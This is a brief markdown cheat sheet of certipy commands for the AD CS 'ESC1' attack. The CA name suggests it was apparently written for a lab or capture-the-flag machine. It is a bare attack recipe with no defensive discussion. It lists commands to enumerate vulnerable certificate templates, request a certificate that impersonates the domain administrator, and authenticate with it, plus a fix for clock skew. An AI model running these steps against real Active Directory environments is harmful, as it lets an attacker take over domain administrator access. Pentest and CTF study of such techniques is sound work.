# ESC1
```bash
# Find
certipy find -u <user> -p <password> -target <dc> -text -stdout -vulnerable

# Exploit
certipy req -u <user> -p <password> -target <dc> -upn administrator@<domain> -ca sequel-dc-ca -template UserAuthentication

# Auth
certipy auth -pfx administrator.pfx

# if clock skew too great :
timedatectl set-ntp off
ntpdate -u <domain-dc>
# redo the auth
```